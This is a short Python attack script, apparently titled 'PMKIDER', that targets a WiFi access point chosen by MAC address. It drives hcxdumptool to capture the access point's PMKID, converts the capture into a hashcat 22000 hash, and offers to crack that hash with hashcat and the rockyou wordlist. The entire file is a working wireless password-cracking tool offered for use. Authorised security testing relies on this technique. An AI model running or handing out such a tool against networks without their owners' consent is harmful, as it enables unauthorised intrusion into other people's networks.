import os
import subprocess
from termcolor import colored
import sys


banner = """

██████╗ ███╗   ███╗██╗  ██╗██╗██████╗ ███████╗██████╗ 
██╔══██╗████╗ ████║██║ ██╔╝██║██╔══██╗██╔════╝██╔══██╗
██████╔╝██╔████╔██║█████╔╝ ██║██║  ██║█████╗  ██████╔╝
██╔═══╝ ██║╚██╔╝██║██╔═██╗ ██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║ ╚═╝ ██║██║  ██╗██║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               developed by 0xissam                                                   
"""

try:
	os.system("clear")
	print(colored(banner, "green"))
	interface = input(colored("[+] Enter the interface on monitor mode : ","green")).strip()
	mac = input(colored("[+] Enter the mac adress of the target : ","green")).strip()
	print("")
	with open("bssid","w") as f:
		newmac = mac.replace(":","")
		f.write(newmac)
		f.close
	try:
		subprocess.check_call(["hcxdumptool", "-o", "pmkid.pcapng", "-i", f"{interface}", "--enable_status=1", "--filterlist_ap=bssid", "--filtermode=2"])
	except KeyboardInterrupt:
		os.remove("bssid")
		pass
	subprocess.check_call(["hcxpcapngtool", "-o", "hash.hc22000", "pmkid.pcapng"])
	os.remove("pmkid.pcapng")
	#os.remove("bssid")
	print("")
	cheke = input(colored("[+] Do you want to crack the hash y/n : ", "green"))
	print("")
	if cheke == "n":
		print(colored("\n[+] Exit", "green"))
		sys.exit()
	elif cheke == "y":
		try:
			subprocess.check_call(["hashcat","-m", "22000",  "hash.hc22000", "/usr/share/wordlists/rockyou.txt"])
		except KeyboardInterrupt:
			#os.remove(hash)
			print(colored("\n[+] Exit","green"))
			sys.exit()
	else:
		print(colored("\n[+] check your input somthing went wronght !","green"))
		print(colored("[+] Exit","green"))
		sys.exit()

except KeyboardInterrupt:
	print(colored("\n[+] Exit","green"))
	sys.exit()
